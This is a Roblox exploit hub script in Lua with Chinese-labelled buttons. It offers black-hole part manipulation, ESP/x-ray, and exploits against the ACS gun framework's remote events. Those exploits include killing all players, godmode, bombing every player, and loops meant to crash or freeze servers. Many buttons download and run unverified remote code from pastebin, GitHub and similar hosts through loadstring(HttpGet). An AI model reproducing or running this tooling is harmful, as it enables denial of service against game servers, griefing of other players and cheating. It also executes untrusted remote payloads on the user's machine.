                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end

        v.CanCollide = false 

        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)

        AlignPosition.MaxForce = math.huge 
        AlignPosition.MaxVelocity = math.huge 
        AlignPosition.Responsiveness = math.huge  -- Always within suction range
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function TeleportAllParts()
    for _, v in next, game:GetService("Workspace"):GetDescendants() do
        TeleportPart(v)
    end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(TeleportPart)

UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.E and not Chat then
        Attachment1.WorldCFrame = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)

spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Mouse.Hit + Vector3.new(0, 5, 0)
        -- Force to stay within the suction range
        for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("Part") and v.Parent ~= Character and not v:IsDescendantOf(Character) then
                local dist = (v.Position - HumanoidRootPart.Position).Magnitude
                if dist > MaxRange then
                    v.Position = HumanoidRootPart.Position + (v.Position - HumanoidRootPart.Position).Unit * MaxRange
                end
            end
        end
    end
end)
  end
})

Tabs.BlackHoleTab:Button({
  Title = "最垃圾黑洞(配合指令“tpua”使用)",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "普通黑洞(E键控制)",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/Sx6PY4gV"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "普通黑洞(第2种)(点击即跟随)",
  Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/BbXuvVkK/raw'),true))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "高级黑洞(吸力超强E键控制)",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/Kgtw4gt7"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第1种)",
  Callback = function()
    print('Hello World!');local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

local Attachment1 = Instance.new("Attachment", Part)

local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local ForceStrength = math.huge

local function TeleportPart(v)
   if v:IsA("Part") and v.Anchored == false and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       Mouse.TargetFilter = v
       for _, x in next, v:GetChildren() do
           if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
               x:Destroy()
           end
       end
       if v:FindFirstChild("Attachment") then
           v:FindFirstChild("Attachment"):Destroy()
       end

       v.CanCollide = false

       local Torque = Instance.new("BodyAngularVelocity", v)
       Torque.AngularVelocity = Vector3.new(0, math.rad(ForceStrength * 4), 0) -- 更快的旋转速度

       local AlignPosition = Instance.new("AlignPosition", v)
       local Attachment2 = Instance.new("Attachment", v)

       AlignPosition.MaxForce = math.huge
       AlignPosition.MaxVelocity = math.huge
       AlignPosition.Responsiveness = math.huge  -- 始终在吸取范围内
       AlignPosition.Attachment0 = Attachment2
       AlignPosition.Attachment1 = Attachment1
   end
end

local function TeleportAllParts()
   for _, v in next, game:GetService("Workspace"):GetDescendants() do
       if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
           TeleportPart(v)
       end
   end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(function(v)
   if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       TeleportPart(v)
   end
end)

UserInputService.InputBegan:Connect(function(Key, Chat)
   if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
   end
end)

spawn(function()
   while game:GetService("RunService").RenderStepped:Wait() do
       Attachment1.WorldCFrame = Updated
   end
end)

--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(Part)
        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, Part in pairs(Network.BaseParts) do
                if Part:IsDescendantOf(Workspace) then
                    Part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" and v.Parent ~= LocalPlayer.Character then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local blackHoleActive = true

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                Attachment1.WorldCFrame = humanoidRootPart.CFrame
            end
        end)
    end
end

local function createControlButton()
    local screenGui = Instance.new("ScreenGui")
    local button = Instance.new("TextButton")

    screenGui.Name = "BlackHoleControlGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    button.Name = "ToggleBlackHoleButton"
    button.Size = UDim2.new(0, 200, 0, 50)
    button.Position = UDim2.new(0.5, -100, 0, 100)
    button.Text = "Desativar Buraco Negro"
    button.Parent = screenGui

    button.MouseButton1Click:Connect(function()
        toggleBlackHole()
        if blackHoleActive then
            button.Text = "Desativar Buraco Negro"
        else
            button.Text = "Ativar Buraco Negro"
        end
    end)
end

createControlButton()
toggleBlackHole()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第2种要输入玩家名字)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/lililiugg/main/jm114514.lua"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第3种)",
  Callback = function()
  local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
 
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
 
if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }
 
    Network.RetainPart = function(Part)
        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end
 
    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, Part in pairs(Network.BaseParts) do
                if Part:IsDescendantOf(Workspace) then
                    Part.Velocity = Network.Velocity
                end
            end
        end)
    end
 
    EnablePartControl()
end
 
local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end
 
local blackHoleActive = true
 
local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end
 
        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)
 
        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                Attachment1.WorldCFrame = humanoidRootPart.CFrame
            end
        end)
    end
end
 
local function createControlButton()
    local screenGui = Instance.new("ScreenGui")
    local button = Instance.new("TextButton")
 
    screenGui.Name = "BlackHoleControlGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
    button.Name = "ToggleBlackHoleButton"
    button.Size = UDim2.new(0, 200, 0, 50)
    button.Position = UDim2.new(0.5, -100, 0, 100)
    button.Text = "Desativar Buraco Negro"
    button.Parent = screenGui
 
    button.MouseButton1Click:Connect(function()
        toggleBlackHole()
        if blackHoleActive then
            button.Text = "Desativar Buraco Negro"
        else
            button.Text = "Ativar Buraco Negro"
        end
    end)
end
 
createControlButton()
toggleBlackHole()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第4种)",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/pYhER1z4/raw"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第5种)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/BLACKHOLDSCRIPT/refs/heads/main/BLACK%20HOLD%20SCRIPT"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第6种)",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/qPcm2zPy"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第7种)(环绕V2)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/666/refs/heads/main/656"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第8种)(传送型黑洞)(别人看不见)",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/U29jR1Cf"))()
  end
})

Tabs.BlackHoleTab:Button({
  Title = "黑洞脚本(第9种)(环绕V3)",
  Callback = function()

   loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/199/refs/heads/main/V3"))()
  
end
})

Tabs.FeZone:Button({
	Title = "念力工具",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/dbcy7SHF"))()
	end 
})

Tabs.FeZone:Button({
	Title = "iy 指令",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	end 
})

Tabs.FeZone:Button({
  Title = "大BOSS",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/NChRru9B"))()
  end
})

Tabs.FeZone:Button({
  Title = "变大变小",
  Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/cEa7d3a5"))()

  end
})

Tabs.FeZone:Button({
  Title = "大飞机",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/EJS2Fde3"))()
  end
})

Tabs.FeZone:Button({
  Title = "巫毒娃娃",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/xqCCqeha"))()
  end
})

Tabs.FeZone:Button({
  Title = "天使",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/RaXbiByH"))()
  end
})

Tabs.FeZone:Button({
  Title = "路管r6",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
  end
})

Tabs.FeZone:Button({
  Title = "炉管r15",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
  end
})

Tabs.ExploitTab:Button({
	Title = "fe quicklycmd",
	Callback = function()
loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
	end 
})


Tabs.ExploitTab:Button({
	Title = "ACS全版本探测器(1.7.5 + 2.0)",
	Callback = function()
		local rs = game:GetService("ReplicatedStorage")
		local function DetectACS()
			local result = {
				Version = nil,
				Found = false,
				RemotePath = nil
			}
			-- 检测ACS 2.0（原版Events / 西语魔改Eventos）
			local acsEngineV2 = rs:FindFirstChild("ACS_Engine")
			if acsEngineV2 then
				local eventFolder = acsEngineV2:FindFirstChild("Events") or acsEngineV2:FindFirstChild("Eventos")
				if eventFolder then
					local hitRemote = eventFolder:FindFirstChild("Hit")
					if hitRemote then
						result.Found = true
						result.Version = "ACS 2.0系列(含西语魔改)"
						result.RemotePath = hitRemote:GetFullName()
						return result
					end
				end
			end

			-- 检测 ACS 1.7.5 旧版结构
			-- ACS1.7.x没有ACS_Engine容器，远程事件直接在ReplicatedStorage根目录
			local hitRemoteV17 = rs:FindFirstChild("Hit")
			if hitRemoteV17 then
				result.Found = true
				result.Version = "ACS 1.7.5 / 1.7系列旧版"
				result.RemotePath = hitRemoteV17:GetFullName()
				return result
			end

			return result
		end

		local info = DetectACS()
		if info.Found then
			warn("✅ 探测成功")
			warn("框架版本："..info.Version)
			warn("远程事件路径："..info.RemotePath)
		else
			warn("❌ 未检测到ACS1.7.5 / ACS2.0 框架")
		end
	end
})

Tabs.ExploitTab:Toggle({
    Title = "ACS2.0.1轰炸全体玩家",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local Players = game:GetService("Players")
        local remote = game:GetService("ReplicatedStorage"):WaitForChild("ACS_Engine"):WaitForChild("Eventos"):WaitForChild("Hit")
        local lp = Players.LocalPlayer
        local conn

        if enabled then
            conn = task.spawn(function()
                while task.wait(0.3) do
                    for _,targetPlr in Players:GetPlayers() do
                        if targetPlr == lp then continue end
                        local char = targetPlr.Character
                        if not char then continue end
                        local root = char:FindFirstChild("HumanoidRootPart")
                        if not root then continue end
                        local args = {
                            root.Position,
                            lp.Character:WaitForChild("HumanoidRootPart"),
                            Vector3.yAxis,
                            Enum.Material.Plastic,
                            {
                                ExPressure = 250,
                                DestroyJointRadiusPercent = 1,
                                ExpRadius = 120,
                                ExplosionDamagesTerrain = true,
                                ExplosiveHit = true,
                                ExplosionDamage = 250
                            }
                        }
                        remote:FireServer(unpack(args))
                    end
                end
            end)
        else
            if conn then
                task.cancel(conn)
            end
        end
    end,
})

Tabs.ExploitTab:Button({
	Title = "acs1.7.5轰炸",
	Callback = function()
local plr = game.Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()

while task.wait(0.05) do
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then continue end

	local args = {
		root.Position,
		Instance.new("Part"),
		Vector3.yAxis,
		Enum.Material.Plastic,
		{
			ExPressure = 999999,
			DestroyJointRadiusPercent = 1,
			ExpRadius = math.huge,
			ExplosionDamagesTerrain = true,
			ExplosiveHit = true,
			ExplosionDamage = math.huge
		}
	}
	game:GetService("ReplicatedStorage").ACS_Engine.Eventos.Hit:FireServer(unpack(args))
end
	end 
})

Tabs.ExploitTab:Button({
	Title = "ac6音乐播放",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-AC6-Music-Vulnerablity-59292"))()
	end 
})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 放置方块",

Callback = function()

local cFrame = CFrame.new(0,0,0)


local Size = {
 X = 9999,
 Y = 9999,
 Z = 9999
}

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 绕过方块限制",

Callback = function()

game:GetService('ReplicatedStorage').ACS_Engine.Events.Refil:FireServer(game.Players.LocalPlayer.Character.ACS_Client.Kit.Fortifications, -99999999)

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 卡死服务器",

Callback = function()

while task.wait() do

  for _, player in next, game.Players:GetPlayers() do
     game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
  end
end

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 无限耐力",

Callback = function()

local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.EnableStamina = false

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 无坠落伤害",

Callback = function()

local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.EnableFallDamage = false

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 无跳跃冷却时间",

Callback = function()

local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.AntiBunnyHop = false

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 价值颠覆者",

Callback = function()

game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Refil:FireServer(game:GetService('Workspace')['virtual_rod']['ACS_Client'].Protecao.VestProtect.Value, 999)

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 2.0.1 卡服",

Callback = function()

while task.wait() do

  for _, player in next, game.Players:GetPlayers() do
      game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
  end
end

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine fe 方块",

Callback = function()

--// Target
local target = game:GetService('Players').LocalPlayer -- localplayer as default

--// CFrame
local cFrame = CFrame.new(0,0,0)

--// Size
local Size = {
   X = 9999,
   Y = 9999,
   Z = 9999
}

--// Build
for _,v in next, game.ReplicatedStorage:GetDescendants() do
   if v.Name == 'Breach' and v:IsA('RemoteFunction') then
       v:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=target.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
   end
end

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 方块",

Callback = function()

local cFrame = CFrame.new(0,0,0)


local Size = {
  X = 1,
  Y = 1,
  Z = 1
}

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 绕过方块限制",

Callback = function()

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Recarregar:FireServer(9999999,{ACS_Modulo={Variaveis={StoredAmmo = game.Players.LocalPlayer.Character.ACS_Client.Kit.Fortifications}}})

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 卡服",

Callback = function()

while task.wait() do

   for i = 1, 30 do
       game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
   end
end

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 无敌",

Callback = function()

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, -math.huge, 0, 0)

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 回血",

Callback = function()

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, -50, 0, 0)

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 杀死所有人",

Callback = function()

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, math.huge, 0, 0)

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 卡服",

Callback = function()

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame={},Size={}})

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 关闭服务器",

Callback = function()

while task.wait() do

   for _, player in next, game.Players:GetPlayers() do
      game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Suppression:FireServer(player, 666, 666, 666)
   end
end

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 VALUE 价值颠覆",

Callback = function()

local value = game.Players.LocalPlayer.Character.Saude.Variaveis.MLs

game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Recarregar:FireServer(1,{ACS_Modulo={Variaveis={StoredAmmo = value}}})

end

})

Tabs.ExploitTab:Button({

Title = "ACS_Engine 1.7.5 卡服",

Callback = function()

while task.wait() do

   for _, player in next, game.Players:GetPlayers() do
       game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Whizz:FireServer(player)
   end
end

end

})

Tabs.ExploitTab:Button({

Title = "memer",

Callback = function()

getgenv()["电脑UI大小"] = UDim2.new(0, 485,0, 565)
getgenv()["手机UI大小"] = UDim2.new(0, 450,0, 275)
loadstring(game:HttpGet("https://raw.githubusercontent.com/MeMeZLand/MeMeR/refs/heads/main/Loader.lua"))()

end

})

Tabs.ExploitTab:Button({
	Title = "免费通行证",
	Callback = function()
--[[ 	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk! ]] loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Server87"))()
	end 
})

Tabs.XrayTab:Section({Title = "透视"})

local transConn, outlineConn, enemyOutline, wallCheck,playerOutlineConn,trackLineConn
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlr = Players.LocalPlayer
local localChar = localPlr.Character or localPlr.CharacterAdded:Wait()
local localRoot = localChar:WaitForChild("HumanoidRootPart")

Tabs.XrayTab:Toggle({
    Title = "全图墙体透明",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            transConn = RunService.RenderStepped:Connect(function()
                for _,part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("BasePart") and part.Transparency == 0 and part.CanCollide then
                        part.Transparency = 0.6
                        part.LocalTransparencyModifier = 0
                    end
                end
            end)
        else
            if transConn then
                transConn:Disconnect()
                transConn = nil
                for _,part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("BasePart") and part.CanCollide then
                        part.Transparency = 0
                        part.LocalTransparencyModifier = 0
                    end
                end
            end
        end
    end,
})

Tabs.XrayTab:Toggle({
    Title = "敌人玩家高亮透视",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            enemyOutline = RunService.RenderStepped:Connect(function()
                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr ~= localPlr and plr.Character then
                        for _,part in ipairs(plr.Character:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.BrickColor = BrickColor.new("Bright red")
                                part.LocalTransparencyModifier = 0
                            end
                        end
                    end
                end
            end)
        else
            if enemyOutline then
                enemyOutline:Disconnect()
                enemyOutline = nil
                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr.Character then
                        for _,part in ipairs(plr.Character:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.BrickColor = BrickColor.new("Medium stone grey")
                            end
                        end
                    end
                end
            end
        end
    end,
})

Tabs.XrayTab:Section({Title = "轮廓"})

Tabs.XrayTab:Toggle({
    Title = "玩家蓝色轮廓透视(仅敌人)",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            playerOutlineConn = RunService.RenderStepped:Connect(function()
                ClearHighlights()
                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr == localPlr then continue end
                    if localPlr.Team and plr.Team and (localPlr.Team == plr.Team) then
                        continue
                    end
                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "PlayerHighlight"
                        highlight.FillTransparency = 1
                        highlight.OutlineTransparency = 0
                        highlight.OutlineColor = Color3.new(0,0.6,1)
                        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        highlight.Parent = plr.Character
                    end
                end
            end)
        else
            if playerOutlineConn then
                playerOutlineConn:Disconnect()
                playerOutlineConn = nil
            end
            ClearHighlights()
        end
    end,
})

local playerOutlineConn
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlr = Players.LocalPlayer

_G.OutlineColor = Color3.new(0,0.6,1)
_G.OutlineRainbow = false

local function ClearHighlights()
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr.Character then
            local hl = plr.Character:FindFirstChild("PlayerHighlight")
            if hl then hl:Destroy() end
        end
    end
end

Tabs.XrayTab:Toggle({
    Title = "玩家蓝色轮廓透视",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            playerOutlineConn = RunService.RenderStepped:Connect(function()
                ClearHighlights()
                local hue = tick()%3
                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr ~= localPlr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "PlayerHighlight"
                        highlight.FillTransparency = 1
                        highlight.OutlineTransparency = 0
                        if _G.OutlineRainbow then
                            highlight.OutlineColor = Color3.fromHSV(hue,1,1)
                        else
                            highlight.OutlineColor = _G.OutlineColor
                        end
                        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        highlight.Parent = plr.Character
                    end
                end
            end)
        else
            if playerOutlineConn then
                playerOutlineConn:Disconnect()
                playerOutlineConn = nil
            end
            ClearHighlights()
        end
    end,
})

Tabs.XrayTab:Colorpicker({
    Title = "透视轮廓自定义颜色",
    Default = Color3.new(0,0.6,1),
    Callback = function(color)
        _G.OutlineColor = color
    end
})

Tabs.XrayTab:Toggle({
    Title = "轮廓彩虹渐变",
    Icon = "rainbow",
    Default = false,
    Callback = function(enabled)
        _G.OutlineRainbow = enabled
    end
})

Tabs.XrayTab:Section({Title = "3d追踪线"})

local trackConn
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlr = Players.LocalPlayer

Tabs.XrayTab:Toggle({
    Title = "全玩家紫色追踪线(Part模拟)",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local lineFolder = workspace:FindFirstChild("FakeTracerParts") or Instance.new("Folder",workspace)
        lineFolder.Name = "FakeTracerParts"

        local function ClearParts()
            for _,obj in ipairs(lineFolder:GetChildren()) do
                obj:Destroy()
            end
        end

        if enabled then
            trackConn = RunService.Heartbeat:Connect(function()
                ClearParts()
                local myChar = localPlr.Character
                if not myChar then return end
                local myRoot = myChar:FindFirstChild("HumanoidRootPart")
                if not myRoot then return end
                local myPos = myRoot.Position

                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr ~= localPlr and plr.Character then
                        local targetRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
                            local tarPos = targetRoot.Position
                            local dist = (myPos - tarPos).Magnitude

                            local tracerPart = Instance.new("Part")
                            tracerPart.Anchored = true
                            tracerPart.CanCollide = false
                            tracerPart.CanTouch = false
                            tracerPart.CastShadow = false
                            tracerPart.BrickColor = BrickColor.new("Hot pink")
                            tracerPart.Size = Vector3.new(0.12,0.12,dist)
